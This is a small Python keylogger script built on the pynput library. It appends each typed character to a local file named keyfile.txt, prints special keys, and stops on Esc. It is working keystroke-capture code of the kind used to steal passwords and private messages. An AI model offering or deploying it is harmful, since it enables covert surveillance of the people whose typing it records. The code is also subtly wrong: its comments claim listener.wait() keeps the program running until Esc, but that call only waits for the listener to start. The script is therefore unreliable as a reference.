from pynput import keyboard

def key_pressed(key):
    try:
        char = key.char
        with open("keyfile.txt", 'a') as log_key:
            log_key.write(char)
            log_key.write('\n')  # Add a new line after each character for better readability
    except AttributeError:
        print(f"Special key {key} pressed.")
    except Exception as e:
        print(f"Error occurred: {e}")

    if key == keyboard.Key.esc:
        # Stop the listener when the 'Esc' key is pressed
        return False

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()

    print("Key logging started. Press 'Esc' to stop.")
    try:
        # Keep the program running until 'Esc' is pressed
        listener.wait()
    except KeyboardInterrupt:
        # Handle manual interruption (e.g., by pressing Ctrl+C) gracefully
        pass
    finally:
        # Stop the listener in case the program exits unexpectedly
        listener.stop()
